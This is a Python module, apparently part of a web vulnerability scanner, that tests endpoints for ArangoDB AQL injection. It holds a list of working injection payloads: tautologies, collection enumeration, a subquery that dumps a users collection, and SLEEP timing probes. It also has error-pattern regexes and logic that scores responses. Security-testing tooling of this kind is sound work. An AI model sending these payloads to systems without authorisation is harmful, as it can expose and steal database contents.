import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class AQLInjector(BaseInjector):
    """ArangoDB AQL injection testing module."""

    name = "aql"
    description = "Tests for ArangoDB AQL injection vulnerabilities"

    ERROR_PATTERNS = [
        r"AQL: syntax error",
        r"AQL:.*unexpected",
        r"arangodb.*error",
        r"1203.*aql",
        r"query specification invalid",
        r"collection.*not found",
        r"bind parameter.*undeclared",
        r"ArangoError",
        r"ERROR_QUERY",
        r"expecting.*got",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            "' //",                     # error-based string termination
            "' OR 1==1 //",             # boolean tautology
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        return [
            # ── String termination with AQL comment ──
            "' //",
            '" //',
            "' /* */",
            # ── Boolean injection (AQL uses ==) ──
            "' OR 1==1 //",
            '" OR 1==1 //',
            "' OR true //",
            '" OR true //',
            "' OR 1==1 LIMIT 1 //",
            # ── FILTER injection ──
            "' OR true RETURN 1 //",
            "' FILTER true RETURN d //",
            # ── LET / RETURN manipulation ──
            "' LET x = 1 RETURN x //",
            "' RETURN document //",
            # ── Collection enumeration ──
            "' FOR c IN _collections RETURN c.name //",
            # ── Subquery injection ──
            "' RETURN (FOR u IN users RETURN u) //",
            # ── Type confusion ──
            "null",
            "true",
            "[]",
            "{}",
            # ── Numeric injection ──
            "0 OR 1==1",
            "1 OR true",
            # ── Function call injection ──
            "' RETURN SLEEP(3) //",
            "' RETURN LENGTH(FOR u IN users RETURN u) //",
            # ── Bind parameter bypass ──
            "@@collection",
            "@value",
            # ── URL-encoded ──
            "%27%20OR%201%3D%3D1%20//",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. ArangoDB error messages
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                if not re.search(pattern, baseline_body.lower(), re.IGNORECASE):
                    evidence.append(f"AQL error pattern: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Time-based
        if "SLEEP" in payload.upper():
            if test_time > baseline_time + 2500:
                evidence.append(
                    f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms"
                )
                is_vulnerable = True
                confidence = "high"

        # Helper: server properly rejected the input (validation error, not a vuln).
        # Only suppresses ambiguous checks — NEVER overrides error/time findings.
        is_rejection = (400 <= test_status < 500)

        if is_rejection and not is_vulnerable:
            return VulnerabilityReport(
                is_vulnerable=False,
                confidence="low",
                details="Server rejected input (validation — not a vuln)",
                evidence=evidence,
            )

        # 3. Boolean / tautology
        if "OR 1==1" in payload or "OR true" in payload:
            if test_status == 200 and len(body) > len(baseline_body) + 20:
                evidence.append("Boolean true returned more data than baseline")
                is_vulnerable = True
                confidence = "medium"

        # 4. Data enumeration
        if "_collections" in payload or "RETURN u" in payload:
            if test_status == 200 and len(body) > len(baseline_body):
                evidence.append("Potential data enumeration — extra data in response")
                is_vulnerable = True
                confidence = "medium"

        # 5. Server error
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "medium"

        # 6. Type confusion — only flag if server errors (not just 400 validation)
        if payload in ("[]", "{}", "null", "true"):
            if test_status == 500 and baseline_status != 500:
                evidence.append("Type confusion: server error with non-string input")
                is_vulnerable = True
                confidence = "low"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
